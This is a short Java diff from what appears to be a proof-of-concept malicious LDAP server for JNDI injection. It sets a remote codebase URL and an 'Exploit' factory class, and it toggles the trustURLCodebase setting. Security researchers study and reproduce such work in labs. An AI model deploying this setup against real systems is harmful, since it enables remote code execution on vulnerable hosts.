@@ -34,12 +34,12 @@ public class Application {
     private static final int PORT = 12345;
 
     private static final String OBJECT_CLASS = "javaNamingReference";
-    private static final String JAVA_CODE_BASE = "http://localhost:8080/code";
+    private static final String JAVA_CODE_BASE = "http://localhost:8080/exploit/#Exploit";
     private static final String JAVA_FACTORY = "Exploit";
     private static final String JAVA_CLASS_NAME = "foo";
 
     public static void main(String[] args) {
-        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
+        //System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
         SpringApplication.run(Application.class, args);
     }
 
